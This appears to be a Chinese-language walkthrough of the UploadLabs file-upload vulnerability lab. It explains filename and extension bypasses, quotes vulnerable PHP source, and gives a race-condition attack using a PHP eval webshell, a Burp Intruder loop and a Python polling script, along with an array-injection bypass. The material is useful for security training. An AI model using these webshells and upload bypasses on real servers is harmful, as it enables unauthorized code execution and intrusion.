[TOC]



# ==UploadLabs靶场环境==

![image-20240804170831494](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804170831494.png)

.php

.php.  .

第五，十关访问的时候空格必须要使用 %20代替

![image-20240802182350515](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240802182350515.png)

第七题在linux服务器上的话，文件名如果末尾只存在空格并不会自动删除，还会保留，但是这样访问的时候也访问不了，但windows就直接将空格删了

![image-20240802183132692](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240802183132692.png)

第十二题 `substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);` 这段代码的功能是 **比如将 shell.php.jpg 中的 jpg提取出来**。`strrpos($_FILES['upload_file']['name'],".")` 这个表示文件名中的最右边的 `.` 的位置。则**整个substr的功能就是将文件名中最右边的点的后面的内容拿出来**

第十七题，这是个纯粹的坑人题目，因为它需要的图片我可以说是很难找到可以用的图片，对于二次渲染的题目，建议使用gif图片，因为相对简单一点，于是我在网上找了一个二次渲染文件上传漏洞的专用图，直接上传，当然，这只是针对这个靶场而言，接下来我讲一下二次渲染文件上传漏洞的利用方法，请看[【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客](https://blog.csdn.net/weixin_45588247/article/details/119177948) 可以说讲的非常详细了，主要步骤就是这压根，如果发现不行，就多试试恶意代码注入的位置然后多试试更换图片

## 第十八题

**代码审计题目 审计结果为条件竞争文件上传**，这样的漏洞在公网上很难利用，一是因为公网访问比本地访问速度慢，而是因为暴力上传文件，非常非常容易被封锁。

第十八题源代码如下：

```php
$is_upload = false;
$msg = null;

// 如果点击了上传文件
if(isset($_POST['submit'])){
    // 先定义一堆变量
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    // 先移动文件到指定目录下
    if(move_uploaded_file($temp_file, $upload_file)){
        // 然后再判断文件后缀名是否在白名单中
        if(in_array($file_ext,$ext_arr)){
            // 如果是符合条件的文件后缀名，则对问价重命名
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            // 如果不是正常的文件后缀名，则删除该上传文件
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

> 总的来说这段代码实现的功能是，先上传并移动了文件到对应目录下，再判断文件后缀名是否正确，如果不正确才删除。几乎没有什么逻辑上的漏洞，那么我们能利用的就是，上传到对应目录下之后判断文件后缀名是否正确之间的这个时间差，在这个时间差内访问到我们上传的这个文件，我们就算成功了。

具体操作步骤如下：

- 创建木马文件 wshell.php ，内容如 `<?php file_put_contents("shelltest.php","<?php @eval($_POST['a']); ?>"); ?>` 

  ![image-20240804155343293](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804155343293.png)

  echo 是为了确保上一句代码可以执行完，再确定是否成功，都则使用请求状态码会有误差

- 使用 bp 抓上传文件的包，发送至 intruder 模块

  ![image-20240804155022226](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804155022226.png)

  ![image-20240804155123170](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804155123170.png)

  当然，你也可以选择数量，我懒得选就用了无限个，同样的，你还可以设置发送间隔，并发量等，我懒得设，就没管

- 编写python脚本，用于访问被写的文件

  ```python
  import  requests
  
  if __name__ == '__main__':
      while True:
          data = {"a":"phpinfo()"}
          resp = requests.post(url="http://192.168.230.147/upload-labs/upload/wshell.php",data=data)
          if (resp.text == "ok"):
              print('nb')
              break
  ```

- 开始运行程序，并开始上传

  ![image-20240804161759343](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804161759343.png)

- 访问成功

  ![image-20240804161819845](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804161819845.png)

## 第十九题

一样的道理，依旧是代码审计和条件竞争，这个难度更大，很难利用

第二十题就是大小写绕过，它使用的是黑名单的方式，代码也很简单

## 第二十一题

这是一个彻彻底底的代码审计题目

```php
$is_upload = false;
$msg = null;
// 如果上传的文件名不是空，就进入if
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        // 如果上传的文件的content-type不在白名单中
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        // 如果上传的save_name是空的，那么文件名就使用上传的文件的文件名，否则，$file就是save_name
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        // 如果$file不是数组，就把他变成数组
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
		
        $ext = end($file);  // 取$file的最后一个元素
        $allow_suffix = array('jpg','png','gif');  // 设置白名单
        
        if (!in_array($ext, $allow_suffix)) {
            // 判断$file的最后一个元素是否在白名单当中
            $msg = "禁止上传该后缀文件!";
        }else{
            // 否则拼接$file_name为 $file的第一个元素的值.$file[count($file) - 1]
            // 如果$file[0]是shell.php $file[1]不存在 $file[2]是jpg
            // 请问程序，你该如何应对
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            // 移动文件
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

**所以我们直接上传一个数组作为$file**

- 构造木马文件

  ![image-20240804165320638](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804165320638.png)



- 抓包

  ![image-20240804165458340](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804165458340.png)

- 修改请求数据包

  原请求数据包内容如下：

  三个参数分别对应三个模块

  ![image-20240804165953184](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804165953184.png)

  其中boundary作为分隔符，在下面的使用中使用 --boundary 作为分隔符

  修改后的请求数据包内容如下：

  ![image-20240804170350155](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804170350155.png)

  ![image-20240804170508748](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804170508748.png)

  发送之后发现，文件上传成功，去访问一下

  ![image-20240804170615795](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240804170615795.png)

  over
